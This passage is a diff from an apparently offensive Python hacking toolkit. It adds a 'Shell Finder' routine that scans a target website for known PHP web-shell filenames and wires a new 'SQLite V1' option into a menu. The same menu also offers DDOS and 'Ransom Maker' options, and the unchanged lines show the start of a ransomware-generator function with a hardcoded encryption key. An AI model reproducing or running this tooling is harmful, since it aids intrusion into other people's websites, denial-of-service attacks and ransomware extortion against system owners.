+                            sh = ['indoxploit.php', 'mini.php', 'shellv3.php', 'shell', 'shell', 'adminweb.php', 'shellv2', 'shellv3']
+                        for i in sh:
+                            print(f"{yellow}[ {green}INFO{yellow} ]{gold} Searching For {i} .. {yellow}[ {green}~ {yellow}]{white}")
+                            if absolute_url.endswith(i):
+                                print(f"{yellow}[{green}~{yellow}]{gold} Shell file: {white}", absolute_url)
+                else:
+                    print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Failed to connect to target, target maybe down or smth else. {white}")
+                    exit()
+            except Exception as e:
+                print(f"{yellow}[ {red}CRITICAL {yellow}] {gold} Error : ", e)
+        if __name__ == '__main__':
+            target = input(f"{yellow}[{green}~{yellow}]{gold} Your Target Url : ")
+            c = input(f"{yellow}[{green}~{yellow}]{gold} Custom Shell Name ? Y/N : {white}")
+            search_shells(target)
+    else:
+        print(red + 'Invalid options!')
+        return sqlite()
 def ransomware1(name, tdir, sa):
     func = "{\n"
     func += "    $key = 'FuckY0URM0MM4H4HaHaHA'; // Replace with your own secret key\n"
@@ -438,7 +933,7 @@ def m2():
     {yellow}│{blue} [02] DDOS {red}[Hot AF]{blue}                                                                              {yellow}│{blue}
     {yellow}│{blue} [03] Shell Finder                                                                               {yellow}│{blue}
     {yellow}│{blue} [04] {green}Ransom Maker V1                                                                            {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [05] {gold}SQLite V1{blue}                                                                                  {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
@@ -4823,6 +5318,9 @@ elif answer == ("20"):
                 name = input("Enter your cyber name : ")
                 sa = input("Save AS [ex : ransomware1, ransomware2] : ")
                 ransomware6(name, sa)
+        elif answer == '5':
+            pass
+            sqlite()
         else:
             print(green + f"Exit..")
             exit()
